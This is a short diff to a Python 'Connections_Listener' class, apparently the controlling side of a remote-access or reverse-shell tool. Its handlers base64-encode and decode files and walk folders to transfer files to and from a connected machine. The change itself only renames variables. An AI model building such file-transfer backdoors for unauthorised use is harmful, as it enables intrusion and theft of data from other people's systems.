@@ -40,13 +40,13 @@ class Connections_Listener:
         return self.receive_data()
     
     def download_file(self, path, content):
-        with open(path, 'wb') as file:
-            file.write(base64.b64decode(content))
+        with open(path, 'wb') as f:
+            f.write(base64.b64decode(content))
             return f"[+] \"{path}\" file download successful"
     
     def upload_files(self, path):
-        with open(path, 'rb') as file:
-            return base64.b64encode(file.read())
+        with open(path, 'rb') as f:
+            return base64.b64encode(f.read())
     
     def upload_crap(self, path):
         try:
@@ -55,8 +55,8 @@ class Connections_Listener:
             elif os.path.isdir(path):
                 for folder, subfolder, files in os.walk(path):
                     for f in files:
-                        file = os.path.join(os.path.basename(path), f)
-                        self.upload_files(file)
+                        file_ = os.path.join(os.path.basename(path), f)
+                        self.upload_files(file_)
         except Exception as error:
             return str(error).encode()
 
